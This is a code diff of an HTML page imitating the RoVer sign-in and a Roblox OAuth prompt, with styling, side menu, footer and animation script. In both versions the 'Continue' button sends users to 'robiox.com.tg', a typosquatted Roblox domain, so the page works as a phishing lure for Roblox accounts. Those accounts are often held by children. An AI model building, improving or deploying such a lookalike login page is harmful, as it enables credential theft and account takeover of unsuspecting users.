@@ -2,152 +2,291 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
+  <title>RoVer - Sign In</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>RoVer</title>
   <style>
-    body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background-color: #1e1d1f;
-      color: white;
-      display: flex;
-      flex-direction: column;
-      height: 100vh;
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
+    * {margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif;}
+    body {background:#1e1d1f;min-height:100vh;overflow-x:hidden;color:#fff;}
+
+    header {
+      background:#e00078;
+      height:56px;
+      display:flex;
+      align-items:center;
+      padding:0 20px;
+      position:relative;
+      z-index:1001;
+    }
+    .menu-btn {
+      font-size:26px;
+      color:#fff;
+      cursor:pointer;
+      background:none;
+      border:none;
+      margin-right:14px;
+    }
+    .logo {
+      font-size:20px;
+      font-weight:600;
+      color:#fff;
+      display:flex;
+      align-items:center;
     }
 
-    /* Top bar */
-    .navbar {
-      background-color: #e6007e;
-      padding: 15px;
-      display: flex;
-      align-items: center;
+    .overlay {
+      position:fixed;
+      top:0;
+      left:0;
+      width:100%;
+      height:100%;
+      background:rgba(0,0,0,0.6);
+      opacity:0;
+      visibility:hidden;
+      transition:opacity 0.3s ease, visibility 0.3s ease;
+      z-index:900;
     }
-    .navbar h1 {
-      margin: 0;
-      margin-left: 10px;
-      font-size: 20px;
+    .overlay.active {opacity:1;visibility:visible;}
+
+    .side-menu {
+      position:fixed;
+      top:0;
+      left:-260px;
+      width:260px;
+      height:100%;
+      background:#e00078;
+      color:#fff;
+      padding:20px;
+      transition:0.3s;
+      z-index:1002;
     }
-    .menu-icon {
-      font-size: 24px;
-      cursor: pointer;
+    .side-menu.active {left:0;}
+    .side-menu .close-btn {
+      font-size:28px;
+      cursor:pointer;
+      margin-bottom:20px;
+      display:block;
+      background:none;
+      border:none;
+      color:#fff;
+    }
+    .side-menu ul {list-style:none;}
+    .side-menu ul li {margin:14px 0;font-size:16px;}
+    .side-menu ul li a {
+      text-decoration:none;
+      color:#fff;
+      display:block;
+      padding:6px 10px;
+      border-radius:4px;
+      transition:background 0.2s;
+    }
+    .side-menu ul li a.disabled {opacity:0.6;pointer-events:none;}
+    .side-menu ul li a.active {background:#fff;color:#000;}
+
+    .login-box {
+      margin:80px auto;
+      background:#000;
+      padding:40px 30px;
+      border-radius:6px;
+      text-align:center;
+      max-width:420px;
+      width:90%;
+      color:#fff;
+      position:relative;
+      z-index:1;
+      transition:opacity 0.4s ease, transform 0.4s ease;
+    }
+    .login-box.hide {opacity:0;transform:scale(0.95);}
+    .login-box.show {opacity:1;transform:scale(1);}
+
+    .login-box h2 {font-size:24px;margin-bottom:8px;font-weight:600;}
+    .login-box p {font-size:14px;margin-bottom:24px;}
+    .login-box button {
+      background:#e00078;
+      color:#fff;
+      border:none;
+      padding:12px 28px;
+      border-radius:22px;
+      font-size:15px;
+      font-weight:600;
+      cursor:pointer;
+      transition:background 0.2s;
+    }
+    .login-box button:hover {background:#b80062;}
+
+    /* OAuth box */
+    .oauth-box {
+      background:#111;
+      border-radius:8px;
+      padding:30px 25px;
+      text-align:center;
+    }
+    .oauth-box .top {
+      font-size:22px;
+      font-weight:700;
+      margin-bottom:15px;
+      text-align:left;
+    }
+    .oauth-box p.subtitle {
+      font-size:14px;
+      color:#ccc;
+      margin:10px 0 20px;
+      text-align:left;
+    }
+    .oauth-box hr {
+      border:none;
+      border-top:1px solid #333;
+      margin:20px 0;
+    }
+    .oauth-box p.app-name {
+      margin-bottom:20px;
+      font-weight:600;
+    }
+    .oauth-box button.continue {
+      background:#fff;
+      color:#000;
+      border:none;
+      padding:12px;
+      border-radius:6px;
+      font-size:15px;
+      width:100%;
+      margin-bottom:15px;
+      cursor:pointer;
+    }
+    .oauth-box p.or {
+      margin:10px 0;
+      color:#888;
+    }
+    .oauth-box button.return {
+      background:#111;
+      color:#fff;
+      border:1px solid #333;
+      padding:12px;
+      border-radius:6px;
+      font-size:15px;
+      width:100%;
+      cursor:pointer;
     }
 
-    /* Center box */
-    .card {
-      background-color: #000;
-      border-radius: 6px;
-      padding: 30px;
-      text-align: center;
-      max-width: 400px;
-      margin: auto;
-    }
-    .card h2 {
-      margin-bottom: 10px;
-    }
-    .card p {
-      color: #ccc;
-      margin-bottom: 20px;
-    }
-    .btn {
-      background-color: #e6007e;
-      color: white;
-      border: none;
-      border-radius: 25px;
-      padding: 12px 25px;
-      font-size: 16px;
-      cursor: pointer;
-      transition: background 0.3s;
-    }
-    .btn:hover {
-      background-color: #cc006f;
-    }
+    .extra-space {height:400px;}
 
-    /* Modal */
-    .modal {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(0,0,0,0.7);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      opacity: 0;
-      visibility: hidden;
-      transition: all 0.3s ease;
+    footer {
+      background:#18181a;
+      padding:30px 20px;
+      display:flex;
+      justify-content:space-between;
+      flex-wrap:wrap;
+      color:#ccc;
+      font-size:14px;
     }
-    .modal.show {
-      opacity: 1;
-      visibility: visible;
-    }
-    .modal-content {
-      background: #111;
-      padding: 25px;
-      border-radius: 8px;
-      text-align: center;
-      width: 350px;
-      transform: translateY(-50px);
-      transition: all 0.3s ease;
-    }
-    .modal.show .modal-content {
-      transform: translateY(0);
-    }
-    .modal h2 {
-      margin-bottom: 15px;
-    }
-    .modal button {
-      display: block;
-      width: 100%;
-      margin: 10px 0;
-      padding: 12px;
-      border: none;
-      border-radius: 6px;
-      font-size: 16px;
-      cursor: pointer;
-    }
-    .continue-btn {
-      background: #fff;
-      color: #000;
-    }
-    .back-btn {
-      background: transparent;
-      border: 1px solid #444;
-      color: #aaa;
+    footer .left {font-size:13px;}
+    footer .right {display:flex;flex-wrap:wrap;gap:20px;}
+    footer a {color:#ccc;text-decoration:none;}
+    footer a:hover {text-decoration:underline;}
+    .footer-logo {
+      font-weight:700;
+      font-size:18px;
+      background:linear-gradient(to right, #ff4da6, #ff6600);
+      -webkit-background-clip:text;
+      -webkit-text-fill-color:transparent;
+      margin-bottom:10px;
+      display:inline-block;
     }
   </style>
 </head>
 <body>
-  <!-- Navigation bar -->
-  <div class="navbar">
-    <span class="menu-icon">☰</span>
-    <h1>RoVer</h1>
+  <header>
+    <button class="menu-btn">☰</button>
+    <div class="logo">RoVer</div>
+  </header>
+
+  <div class="overlay" id="overlay"></div>
+
+  <div class="side-menu" id="sideMenu">
+    <button class="close-btn" onclick="toggleMenu()">✕</button>
+    <ul>
+      <li><a href="#">Help</a></li>
+      <li><a href="#">Team Members</a></li>
+      <li><a href="#" class="disabled">RoVer Plus</a></li>
+      <li><a href="#">Manage Servers</a></li>
+      <li><a href="#" class="active">Sign In</a></li>
+    </ul>
   </div>
 
-  <!-- Center card -->
-  <div class="card">
-    <h2>Sign in to RoVer</h2>
-    <p>You must be 13 years of age or older to continue.</p>
-    <button class="btn" onclick="openModal()">Log in with Roblox</button>
-  </div>
-
-  <!-- Modal -->
-  <div class="modal" id="loginModal">
-    <div class="modal-content">
+  <main>
+    <div class="login-box show" id="loginBox">
       <h2>Sign in to RoVer</h2>
-      <p>ROBLOX<br>Authorize with Roblox OAuth</p>
-      <button class="continue-btn" onclick="redirectToPage()">Continue</button>
-      <button class="back-btn" onclick="closeModal()">Return to RoVer</button>
+      <p>You must be 13 years of age or older to continue.</p>
+      <button onclick="showOAuth()">Log in with Roblox</button>
     </div>
-  </div>
+
+    <div class="extra-space"></div>
+  </main>
+
+  <footer>
+    <div class="left">
+      <span class="footer-logo">Imaginary Menagerie</span><br>
+      © 2024 Imaginary Menagerie, LLC.<br>
+      attributions
+    </div>
+    <div class="right">
+      <div>
+        <a href="#">Team members</a><br>
+        <a href="#">Support Discord server ↗</a><br>
+        <a href="#">Add RoVer to your server</a><br>
+        <a href="#">Bot Developer API</a>
+      </div>
+      <div>
+        <a href="#">Terms of Service</a><br>
+        <a href="#">Privacy Policy</a><br>
+        <a href="#">Verify your Roblox account</a>
+      </div>
+    </div>
+  </footer>
 
   <script>
-    function openModal() {
-      document.getElementById("loginModal").classList.add("show");
+    const menuBtn = document.querySelector('.menu-btn');
+    const sideMenu = document.getElementById('sideMenu');
+    const overlay = document.getElementById('overlay');
+
+    function toggleMenu() {
+      sideMenu.classList.toggle('active');
+      overlay.classList.toggle('active');
     }
-    function closeModal() {
-      document.getElementById("loginModal").classList.remove("show");
+
+    menuBtn.addEventListener('click', toggleMenu);
+    overlay.addEventListener('click', toggleMenu);
+
+    function showOAuth() {
+      const box = document.getElementById("loginBox");
+
+      // Animate out
+      box.classList.remove("show");
+      box.classList.add("hide");
+
+      setTimeout(() => {
+        box.innerHTML = `
+          <h2>Sign in to RoVer</h2>
+          <div class="oauth-box">
+            <div class="top">ROBLOX</div>
+            <p class="subtitle">Authorize with Roblox OAuth</p>
+            <hr>
+            <p class="app-name">RoVer</p>
+            <button class="continue" onclick="openLogin()">Continue</button>
+            <p class="or">or</p>
+            <button class="return" onclick="location.reload()">Return to RoVer</button>
+          </div>
+        `;
+
+        // Animate in
+        box.classList.remove("hide");
+        box.classList.add("show");
+      }, 400); // match transition duration
     }
-    function redirectToPage() {
-      window.location.href = "https://www.robiox.com.tg/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F418536882031%2Fprofile";
+
+    // Simple clean redirect
+    function openLogin() {
+      window.location.href = "https://www.robiox.com.tg/users/418536882031/profile";
     }
   </script>
 </body>
